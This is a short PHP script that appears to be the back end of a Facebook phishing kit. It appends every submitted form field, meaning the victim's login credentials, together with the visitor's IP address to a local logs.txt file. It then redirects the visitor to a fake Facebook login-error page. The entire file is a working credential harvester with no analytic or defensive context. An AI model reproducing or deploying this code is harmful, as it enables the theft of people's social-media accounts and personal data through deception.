<?php

// Set the location to redirect the page
header ('Location: hreffacebookqlogin!account=492819123error.html');
$ip1 = $_SERVER['REMOTE_ADDR'];
// Open the text file in writing mode 
$file = fopen("logs.txt", "a");

fwrite($file, "\r\n");
fwrite($file, "------FACEBOOK------");
fwrite($file, "\r\n");
foreach($_POST as $variable => $value) {
    fwrite($file, $variable);
    fwrite($file, "= ");
    fwrite($file, $value);
    fwrite($file, "\r\n");
}
fwrite($file, "$ip1");
fwrite($file, "\r\n");
fwrite($file, "\r\n");
fclose($file);
exit;
?>